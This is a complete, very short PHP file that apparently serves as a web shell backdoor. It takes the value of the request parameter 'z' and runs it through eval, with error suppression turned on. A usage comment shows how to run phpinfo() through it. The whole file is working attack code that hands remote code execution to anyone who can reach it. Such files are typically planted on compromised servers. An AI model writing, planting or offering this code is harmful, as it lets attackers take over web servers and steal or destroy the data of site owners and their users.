<?php
	//usage: ?z=phpinfo();
	$x=$_REQUEST['z'];
	@eval("\$safedg = $x;");  
?>